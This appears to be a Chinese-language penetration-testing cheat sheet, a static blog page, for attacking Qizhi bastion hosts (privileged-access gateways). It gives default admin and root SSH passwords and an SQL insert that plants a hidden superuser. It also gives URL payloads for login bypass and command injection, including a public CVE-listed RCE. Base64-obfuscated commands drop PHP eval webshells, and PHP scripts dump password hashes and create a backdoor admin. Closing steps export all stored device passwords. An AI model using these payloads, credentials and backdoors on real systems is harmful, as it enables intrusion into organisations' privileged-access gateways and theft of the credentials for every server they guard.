@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    
+    <link rel="shortcut icon" href="../../../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>齐治 - ConsT27's Blog</title>
+    <link href="../../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u9f50\u6cbb", url: "#_top", children: [
+              {title: "\u76ee\u5f55", url: "#_2" },
+              {title: "\u5821\u5792\u673aJAVA", url: "#java" },
+              {title: "\u5821\u5792\u673aPHP", url: "#php" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav">
+      <a href="../../%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7/" class="btn btn-xs btn-link">
+        锐捷
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="_1">齐治</h1>
+<h2 id="_2">目录</h2>
+<ul>
+<li><a href="#堡垒机JAVA">堡垒机JAVA</a><ul>
+<li><a href="#默认口令">默认口令</a></li>
+<li><a href="#前渗透">前渗透</a></li>
+<li><a href="#后渗透">后渗透</a><ul>
+<li><a href="#创建超级用户">创建超级用户</a></li>
+<li><a href="#向主机下发命令">向主机下发命令</a></li>
+<li><a href="#访问资产">访问资产</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#堡垒机PHP">堡垒机PHP</a><ul>
+<li><a href="#前渗透">前渗透</a><ul>
+<li><a href="#任意用户登录">任意用户登录</a></li>
+<li><a href="#后台rce">后台rce</a></li>
+<li><a href="#前台RCECNVD-2019-20835">前台RCE（CNVD-2019-20835）</a></li>
+</ul>
+</li>
+<li><a href="#后渗透">后渗透</a><ul>
+<li><a href="#获取管理员密码">获取管理员密码</a></li>
+<li><a href="#新建管理员">新建管理员</a></li>
+<li><a href="#设备密码导出">设备密码导出</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>怎么判断堡垒机是java还是php？用chrome插件wappalyzer！</p>
+<h2 id="java">堡垒机JAVA</h2>
+<p>app="齐治科技-堡垒机"</p>
+<h3 id="_3">默认口令</h3>
+<p>默认账号密码为<strong>admin/admin</strong></p>
+<p>SSH用户：<strong>root</strong></p>
+<p>SSH密码：<strong>4OO88O2393</strong></p>
+<h3 id="_4">前渗透</h3>
+<p>无公开漏洞</p>
+<h3 id="_5">后渗透</h3>
+<h4 id="_6">创建超级用户</h4>
+<p>登录数据库</p>
+<pre><code class="language-纯文本">psql -U shterm -h 127.0.0.1  -d shterm
+</code></pre>
+<p>执行</p>
+<pre><code class="language-纯文本">INSERT INTO &quot;public&quot;.&quot;tbl_user&quot; (&quot;id&quot;, &quot;login_name&quot;, &quot;user_name&quot;, &quot;passwd&quot;, &quot;email&quot;, &quot;role_id&quot;, &quot;authtype_id&quot;, &quot;auth_info&quot;, &quot;state&quot;, &quot;ext_info&quot;, &quot;extra&quot;, &quot;last_login_time&quot;, &quot;pwd_change_time&quot;, &quot;authtoken_id&quot;, &quot;valid_from&quot;, &quot;valid_to&quot;, &quot;pwd_valid&quot;, &quot;join_time&quot;, &quot;join_user&quot;, &quot;update_time&quot;, &quot;deleted&quot;, &quot;remark&quot;, &quot;ssh_key&quot;, &quot;user_type&quot;, &quot;region_id&quot;, &quot;delete_time&quot;, &quot;disabled_time&quot;, &quot;department_id&quot;, &quot;audit_scope&quot;, &quot;user_category&quot;) VALUES (10088, 'shtermManager', 'shtermManager', '{bcrypt}$2a$10$5Jt5ncvrj5rBZtfQR6YQaeWIuqqJZd1k1KSU23umZeFU89fCYu4la', NULL, 1, 1, '{&quot;passwordType&quot;: &quot;custom&quot;}', 0, '{}', '{&quot;locale&quot;: {&quot;country&quot;: &quot;CN&quot;, &quot;language&quot;: &quot;zh&quot;}, &quot;userNav&quot;: [{&quot;name&quot;: &quot;User.nav_All&quot;, &quot;useOr&quot;: false, &quot;filters&quot;: []}, {&quot;name&quot;: &quot;role.ROLE_CONFIG&quot;, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;role.id&quot;, &quot;oper&quot;: &quot;In&quot;, &quot;value&quot;: &quot;2&quot;}]}, {&quot;name&quot;: &quot;role.ROLE_ADMIN&quot;, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;role.id&quot;, &quot;oper&quot;: &quot;In&quot;, &quot;value&quot;: &quot;1&quot;}]}, {&quot;name&quot;: &quot;User.nav_NoGroup&quot;, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;usergroups&quot;, &quot;oper&quot;: &quot;Null&quot;, &quot;value&quot;: &quot;true&quot;}]}, {&quot;name&quot;: &quot;User.state.3&quot;, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;state&quot;, &quot;oper&quot;: &quot;In&quot;, &quot;value&quot;: &quot;3&quot;}]}, {&quot;name&quot;: &quot;User.state.2&quot;, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;state&quot;, &quot;oper&quot;: &quot;In&quot;, &quot;value&quot;: &quot;2&quot;}]}, {&quot;name&quot;: &quot;User.state.1&quot;, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;state&quot;, &quot;oper&quot;: &quot;In&quot;, &quot;value&quot;: &quot;1&quot;}]}, {&quot;name&quot;: &quot;User.nav_Inactive&quot;, &quot;useOr&quot;: true, &quot;filters&quot;: [{&quot;attr&quot;: &quot;lastLoginTime&quot;, &quot;oper&quot;: &quot;Before&quot;, &quot;value&quot;: &quot;2021-08-21&quot;}, {&quot;attr&quot;: &quot;lastLoginTime&quot;, &quot;oper&quot;: &quot;Null&quot;, &quot;value&quot;: &quot;true&quot;}]}], &quot;appOldNav&quot;: [{&quot;name&quot;: &quot;dev.appall&quot;, &quot;count&quot;: 0, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;type&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;3&quot;}, {&quot;attr&quot;: &quot;state&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;deleted&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;false&quot;}]}, {&quot;name&quot;: &quot;B/S&quot;, &quot;count&quot;: 0, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;sysType.name&quot;, &quot;oper&quot;: &quot;Contains&quot;, &quot;value&quot;: &quot;B/S&quot;}, {&quot;attr&quot;: &quot;type&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;3&quot;}, {&quot;attr&quot;: &quot;state&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;deleted&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;false&quot;}]}, {&quot;name&quot;: &quot;C/S&quot;, &quot;count&quot;: 0, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;sysType.name&quot;, &quot;oper&quot;: &quot;Contains&quot;, &quot;value&quot;: &quot;C/S&quot;}, {&quot;attr&quot;: &quot;type&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;3&quot;}, {&quot;attr&quot;: &quot;state&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;deleted&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;false&quot;}]}, {&quot;name&quot;: &quot;Weblogic&quot;, &quot;count&quot;: 0, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;sysType.name&quot;, &quot;oper&quot;: &quot;Contains&quot;, &quot;value&quot;: &quot;Weblogic&quot;}, {&quot;attr&quot;: &quot;type&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;3&quot;}, {&quot;attr&quot;: &quot;state&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;deleted&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;false&quot;}]}, {&quot;name&quot;: &quot;B/S IE&quot;, &quot;count&quot;: 0, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;sysType.name&quot;, &quot;oper&quot;: &quot;Contains&quot;, &quot;value&quot;: &quot;B/S IE&quot;}, {&quot;attr&quot;: &quot;type&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;3&quot;}, {&quot;attr&quot;: &quot;state&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;deleted&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;false&quot;}]}], &quot;devOldNav&quot;: [{&quot;name&quot;: &quot;dev.hostall&quot;, &quot;count&quot;: 0, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;type&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;state&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;deleted&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;false&quot;}]}, {&quot;name&quot;: &quot;Linux&quot;, &quot;count&quot;: 0, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;sysType.name&quot;, &quot;oper&quot;: &quot;Contains&quot;, &quot;value&quot;: &quot;Linux&quot;}, {&quot;attr&quot;: &quot;type&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;state&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;deleted&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;false&quot;}]}, {&quot;name&quot;: &quot;Windows&quot;, &quot;count&quot;: 0, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;sysType.name&quot;, &quot;oper&quot;: &quot;Contains&quot;, &quot;value&quot;: &quot;Windows&quot;}, {&quot;attr&quot;: &quot;type&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;state&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;deleted&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;false&quot;}]}, {&quot;name&quot;: &quot;HP UX&quot;, &quot;count&quot;: 0, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;sysType.name&quot;, &quot;oper&quot;: &quot;Contains&quot;, &quot;value&quot;: &quot;HP UX&quot;}, {&quot;attr&quot;: &quot;type&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;state&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;deleted&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;false&quot;}]}, {&quot;name&quot;: &quot;IBM AIX&quot;, &quot;count&quot;: 0, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;sysType.name&quot;, &quot;oper&quot;: &quot;Contains&quot;, &quot;value&quot;: &quot;IBM AIX&quot;}, {&quot;attr&quot;: &quot;type&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;state&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;deleted&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;false&quot;}]}, {&quot;name&quot;: &quot;IBM AS/400&quot;, &quot;count&quot;: 0, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;sysType.name&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;IBM AS/400&quot;}, {&quot;attr&quot;: &quot;type&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;state&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;deleted&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;false&quot;}]}], &quot;accessServ&quot;: {&quot;changepwd&quot;: 1690250316342, &quot;automation&quot;: 1690250226507, &quot;deviceaccess&quot;: 1690199078938}, &quot;indexWidgets&quot;: [], &quot;changePlanNav&quot;: [{&quot;name&quot;: &quot;secretChangePlan.nav_plan_All&quot;, &quot;filters&quot;: [{&quot;attr&quot;: &quot;status&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}]}, {&quot;name&quot;: &quot;secretChangePlan.nav_plan_maunl&quot;, &quot;filters&quot;: [{&quot;attr&quot;: &quot;execType&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;1&quot;}, {&quot;attr&quot;: &quot;status&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}]}, {&quot;name&quot;: &quot;secretChangePlan.nav_plan_fail&quot;, &quot;filters&quot;: [{&quot;attr&quot;: &quot;execResult&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;2&quot;}, {&quot;attr&quot;: &quot;status&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}]}], &quot;updateListNav&quot;: [{&quot;name&quot;: &quot;cloud.update.all&quot;, &quot;useOr&quot;: false, &quot;filters&quot;: []}, {&quot;name&quot;: &quot;cloud.process.1&quot;, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;status&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;1&quot;}]}, {&quot;name&quot;: &quot;cloud.process.4&quot;, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;status&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;4&quot;}]}, {&quot;name&quot;: &quot;cloud.process.2&quot;, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;status&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;2&quot;}]}, {&quot;name&quot;: &quot;cloud.process.3&quot;, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;status&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;3&quot;}]}], &quot;databaseOldNav&quot;: [{&quot;name&quot;: &quot;dev.databaseall&quot;, &quot;count&quot;: 0, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;type&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;2&quot;}, {&quot;attr&quot;: &quot;state&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;deleted&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;false&quot;}]}, {&quot;name&quot;: &quot;Oracle&quot;, &quot;count&quot;: 0, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;sysType.name&quot;, &quot;oper&quot;: &quot;Contains&quot;, &quot;value&quot;: &quot;Oracle&quot;}, {&quot;attr&quot;: &quot;type&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;2&quot;}, {&quot;attr&quot;: &quot;state&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;deleted&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;false&quot;}]}, {&quot;name&quot;: &quot;MYSQL&quot;, &quot;count&quot;: 0, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;sysType.name&quot;, &quot;oper&quot;: &quot;Contains&quot;, &quot;value&quot;: &quot;MYSQL&quot;}, {&quot;attr&quot;: &quot;type&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;2&quot;}, {&quot;attr&quot;: &quot;state&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;deleted&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;false&quot;}]}, {&quot;name&quot;: &quot;MSSQL&quot;, &quot;count&quot;: 0, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;sysType.name&quot;, &quot;oper&quot;: &quot;Contains&quot;, &quot;value&quot;: &quot;MSSQL&quot;}, {&quot;attr&quot;: &quot;type&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;2&quot;}, {&quot;attr&quot;: &quot;state&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;deleted&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;false&quot;}]}, {&quot;name&quot;: &quot;DB2&quot;, &quot;count&quot;: 0, &quot;useOr&quot;: false, &quot;filters&quot;: [{&quot;attr&quot;: &quot;sysType.name&quot;, &quot;oper&quot;: &quot;Contains&quot;, &quot;value&quot;: &quot;DB2&quot;}, {&quot;attr&quot;: &quot;type&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;2&quot;}, {&quot;attr&quot;: &quot;state&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;0&quot;}, {&quot;attr&quot;: &quot;deleted&quot;, &quot;oper&quot;: &quot;Is&quot;, &quot;value&quot;: &quot;false&quot;}]}]}', '2021-11-21 04:04:04.612', '2021-11-21 09:55:32.875', NULL, NULL, NULL, 0, NULL, NULL, '2021-11-21 09:55:32.875', 'f', NULL, NULL, 0, NULL, NULL, NULL, 1, NULL, 0);
+</code></pre>
+<p>用户名：shtermManager</p>
+<p>密码：Shterm10086</p>
+<p><strong>登录后修改密码，即可获得完整权限</strong></p>
+<h4 id="_7">向主机下发命令</h4>
+<p>工作台→自动化→增加脚本任务→添加目标资产→自定义命令→立即执行</p>
+<h4 id="_8">访问资产</h4>
+<ol>
+<li>web服务访问：工作台→访问资产</li>
+<li>rdp访问：rdp登录堡垒机，输入web服务的账户密码，进去后就是可登录列表</li>
+<li>ssh访问：输入web服务的账户密码，进去后就是可登录列表</li>
+</ol>
+<h2 id="php">堡垒机PHP</h2>
+<h3 id="_9">前渗透</h3>
+<h4 id="_10">任意用户登录</h4>
+<pre><code class="language-纯文本">http://xxx.xxx.xxx.xxx/audit/gui_detail_view.php?token=1&amp;id=%5C&amp;uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&amp;login=shterm
+
+</code></pre>
+<p>状态码返回200，存在漏洞；“错误ID”提示，不存在漏洞。</p>
+<h4 id="rce">后台rce</h4>
+<pre><code class="language-纯文本">/audit/data_provider.php?ds_y=2019&amp;ds_m=04&amp;ds_d=02&amp;ds_hour=09&amp;ds_min40&amp;server_cond=&amp;service=$(id)&amp;identity_cond=&amp;query_type=all&amp;format=json&amp;browse=true
+</code></pre>
+<p>或者</p>
+<pre><code class="language-纯文本">/audit/data_provider.php?ds_y=2019&amp;ds_m=04&amp;ds_d=02&amp;ds_hour=09&amp;ds_min40&amp;server_cond=&amp;service=127.0.0.1&amp;identity_cond=&amp;query_type=all&amp;format=json&amp;browse=true&amp;priority=`id`
+</code></pre>
+<p>写webshell到 <strong>/var/www/icons/tui/</strong>，然后访问/icons/tui/service.php</p>
+<pre><code class="language-纯文本">/audit/data_provider.php?ds_y=2019&amp;ds_m=04&amp;ds_d=02&amp;ds_hour=09&amp;ds_min40&amp;server_cond=&amp;service=127.0.0.1&amp;identity_cond=&amp;query_type=all&amp;format=json&amp;browse=true&amp;priority=`echo${IFS}ZWNobyAnPD9waHAgQGV2YWwoJF9QT1NUWzkwXSk7Pz4nID4gL3Zhci93d3cvaWNvbnMvdHVpL3NlcnZpY2UucGhw|base64${IFS}-d|sh` 
+</code></pre>
+<h4 id="rcecnvd-2019-20835">前台RCE（CNVD-2019-20835）</h4>
+<p>访问如下url返回ok即存在。</p>
+<pre><code class="language-纯文本">/listener/cluster_manage.php
+</code></pre>
+<p>然后访问如下链接，即可在根目录 <strong>/var/www/shterm/resources/qrcode/lbj77.php</strong> 下生成PHP一句话马</p>
+<pre><code class="language-纯文本">https://10.20.10.10/ha_request.php?action=install&amp;ipaddr=localhost&amp;node_id=1${IFS}|`echo${IFS}&quot; ZWNobyAnPD9waHAgQGV2YWwoJF9SRVFVRVNUWzEwMDg2XSk7Pz4nPj4vdmFyL3d3dy9zaHRlcm0vcmVzb3VyY2VzL3FyY29kZS9sYmo3Ny5waHAK&quot;|base64${IFS}- d|bash`|${IFS}|echo${IFS}
+</code></pre>
+<p>然后访问如下链接即可使用webshell</p>
+<pre><code class="language-纯文本">/resources/qrcode/lbj77.php
+</code></pre>
+<h3 id="_11">后渗透</h3>
+<h4 id="_12">获取管理员密码</h4>
+<p>拿到shell后，在 /icons/tui/ 目录下新建 common.php 文件，然后访问 <strong>/icons/tui/common.php</strong>即可看到各用户hash，hash可到cmd5解密</p>
+<pre><code class="language-纯文本">&lt;?PHP
+$CONFIG[&quot;nomenu&quot;] = true;
+$CONFIG[&quot;nochangepw&quot;] = true;
+require_once(&quot;/var/www/shterm/include/common.php&quot;);
+
+$q1 = pg_escape(&quot;SELECT count(*) FROM identity&quot;);
+$r1 = pg_fetch_assoc($q1);
+echo &quot;用户数量：&quot;;
+print_r($r1);
+
+$q = pg_escape(&quot;SELECT * FROM identity&quot;);
+$i = 0;
+while($r = pg_fetch_assoc($q)){
+    ++$i;
+    echo &quot;
+    &quot;;
+    echo  &quot;
+    id ：&quot; . $r[&quot;id&quot;];
+    if($r[&quot;status&quot;] == 1){$status = &quot;否&quot;;}else{$status = &quot;是&quot;;}
+    echo  &quot;
+    是否禁用 ：&quot; . $status;
+    if( $r[&quot;role_admin&quot;] == 1 &amp;&amp; $r[&quot;role_manager&quot;] == 1 &amp;&amp; $r[&quot;role_audit&quot;] == 1 &amp;&amp; $r[&quot;role_shell&quot;]==1 &amp;&amp; $r[&quot;role_pwrcpt&quot;]==1 ){
+        $usertype = &quot;超级管理员&quot;;
+    }elseif ($r[&quot;role_admin&quot;] == 1) {
+       $usertype = &quot;超级管理员&quot;;
+    }elseif ($r[&quot;role_manager&quot;] == 1) {
+         $usertype = &quot;配置管理员&quot;;
+    }elseif ($r[&quot;role_audit&quot;] == 1) {
+         $usertype = &quot;审计管理员&quot;;
+    }elseif ($r[&quot;role_shell&quot;] == 1) {
+         $usertype = &quot;普通用户&quot;;
+    }elseif ($r[&quot;role_pwrcpt&quot;] == 1) {
+         $usertype = &quot;密码保管员&quot;;
+    }
+    echo  &quot;
+    用户类型 ：&quot; . $usertype;
+    echo  &quot;
+    登录名：&quot; . $r[&quot;login&quot;];
+    echo &quot;
+    姓名：&quot; . $r['name'];
+    echo &quot;
+    密码信息：&quot; . $r['auth_data'];
+}
+
+?&gt;
+</code></pre>
+<h4 id="_13">新建管理员</h4>
+<p>如果管理员密码实在无法解密，就新建一个吧。</p>
+<p>在 <strong>/icons/tui/</strong> 目录下新建 <strong>about.php</strong> 文件</p>
+<p>用户名：<strong>360team</strong></p>
+<p>密码： <strong>shterm</strong></p>
+<pre><code class="language-纯文本">&lt;?PHP
+$CONFIG[&quot;nomenu&quot;] = true;
+$CONFIG[&quot;nochangepw&quot;] = true;
+require_once(&quot;/var/www/shterm/include/common.php&quot;);
+
+$q2 = pg_escape(&quot;INSERT INTO identity(id,status,login,name,company,department,domain,post,number,email,mobile,auth_method,auth_data,x509_dn,auth,passwd_salt,passwd_sha1,passwd_expire,passwd_change,ipaddr_limit,crypt_passwd,pgp_pubkey,role_admin,role_manager,role_audit,role_shell,role_pwrcpt,default_dept,valid_date1,valid_date2,create_stamp,modify_stamp,create_identity,lastlogin_stamp,tui_client,server_grid_way,remark,theme,client_tuires,client_guires,totp_params,challenge_message,challenge_state,options,attrs,perms) VALUES(100900,'1','360team','360team','','ROOT','1','','','','','1','{\&quot;hash\&quot;: \&quot;9a15a976afaefb1d3e1ac21f62be336e2054c3d0\&quot;, \&quot;times\&quot;: 1, \&quot;expire\&quot;: \&quot;\&quot;, \&quot;algo\&quot;: \&quot;shterm1\&quot;, \&quot;salt\&quot;: \&quot;nukj4rT0aa\&quot;, \&quot;change\&quot;: false}','','native','','',null,null,'','','',1,1,1,1,1,null,null,null,null,'2023-01-13 10:44:17.965318',null,'2023-01-16 13:14:47.295477','','','','','','','','','','{\&quot;perms\&quot;:\&quot;\&quot;}','','{\&quot;manager\&quot;:[1],\&quot;audit\&quot;:[1],\&quot;pwrcpt\&quot;:[1]}')&quot;);
+$r2 = pg_fetch_assoc($q2);
+echo &quot;新增用户成功&quot;;
+</code></pre>
+<h4 id="_14">设备密码导出</h4>
+<p>首先把账户弄成密码保管员权限。
+然后点击账户设置→修改设置（输入用户的登录密码）→zip文件密码设置zip解压密码。
+然后密码控制→密码备份即可导出一份密码本zip，解压密码为刚刚设置好的zip解压密码。
+如果要连接设备，可以直接ssh或者rdp上去连，用户密码为堡垒机web服务的用户密码.</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav">
+      <a href="../../%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7/" class="btn btn-xs btn-link">
+        锐捷
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
